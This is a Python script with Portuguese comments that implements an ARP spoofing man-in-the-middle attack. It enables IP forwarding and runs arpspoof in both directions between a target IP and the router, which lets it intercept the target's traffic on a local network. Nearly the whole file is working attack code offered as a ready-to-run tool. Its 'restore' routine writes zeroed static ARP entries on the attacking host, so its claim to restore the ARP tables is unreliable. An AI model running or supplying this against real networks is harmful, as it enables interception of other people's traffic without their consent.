import subprocess
import os
import time
import argparse

class ARPSpoofer:
    def __init__(self, target_ip: str, router_ip: str, interface: str = None):
        """
        Inicializa o ARPSpoofer com os IPs do alvo e do roteador.

        Args:
            target_ip (str): Endereco IP do host alvo.
            router_ip (str): Endereco IP do roteador.
            interface (str): Interface de rede utilizada. Se None, sera detectada automaticamente.
        """
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.interface = interface or self.detect_interface()

    def detect_interface(self) -> str:
        """
        Detecta a interface de rede conectada ao gateway padrao.

        Returns:
            str: Nome da interface ativa.
        """
        try:
            with os.popen("ip route | grep default") as route_info:
                default_route = route_info.read().strip()
            if not default_route:
                raise RuntimeError("Nenhuma rota padrao encontrada.")

            # Extraindo o nome da interface
            parts = default_route.split()
            interface = parts[parts.index("dev") + 1] if "dev" in parts else None

            if not interface or not os.path.exists(f"/sys/class/net/{interface}"):
                raise RuntimeError(f"Interface detectada ({interface}) nao e valida.")

            print(f"[INFO] Interface detectada automaticamente: {interface}")
            return interface
        except Exception as e:
            print(f"[ERRO] Falha ao detectar a interface: {e}")
            raise

    def enable_ip_forwarding(self) -> None:
        """
        Habilita o encaminhamento de pacotes (IP Forwarding) no sistema.
        """
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[INFO] IP Forwarding habilitado.")

    def disable_ip_forwarding(self) -> None:
        """
        Desabilita o encaminhamento de pacotes (IP Forwarding) no sistema.
        """
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[INFO] IP Forwarding desabilitado.")

    def start_spoofing(self) -> None:
        """
        Inicia o ARP Spoofing enviando pacotes falsificados.
        """
        print(f"[INFO] Iniciando ARP Spoofing: {self.target_ip} <-> {self.router_ip} na interface {self.interface}")
        subprocess.Popen(["arpspoof", "-i", self.interface, "-t", self.target_ip, self.router_ip],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(["arpspoof", "-i", self.interface, "-t", self.router_ip, self.target_ip],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def stop_spoofing(self) -> None:
        """
        Interrompe o ARP Spoofing e restaura as tabelas ARP.
        """
        print("[INFO] Parando ARP Spoofing...")
        os.system("pkill arpspoof")
        time.sleep(1)  # Pequena espera para garantir que os processos terminem

        print("[INFO] Restaurando tabelas ARP...")
        # Restaurar o roteador
        subprocess.run(["arp", "-s", self.router_ip, "00:00:00:00:00:00"])
        # Restaurar o alvo
        subprocess.run(["arp", "-s", self.target_ip, "00:00:00:00:00:00"])
        print("[INFO] Tabelas ARP restauradas.")

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="ARPSpoofer - Executa ARP Spoofing em um host alvo.")
    parser.add_argument("target_ip", help="Endereco IP do host alvo.")
    parser.add_argument("router_ip", help="Endereco IP do roteador.")
    args = parser.parse_args()

    spoofer = ARPSpoofer(args.target_ip, args.router_ip)

    spoofer.enable_ip_forwarding()
    spoofer.start_spoofing()

    print("[INFO] Spoofing em execucao. Pressione Ctrl+C para interromper.")
    try:
        while True:
            pass  # Mantem o script rodando
    except KeyboardInterrupt:
        print("\n[INFO] Interrupcao detectada. Restaurando estado...")
        spoofer.stop_spoofing()
        spoofer.disable_ip_forwarding()
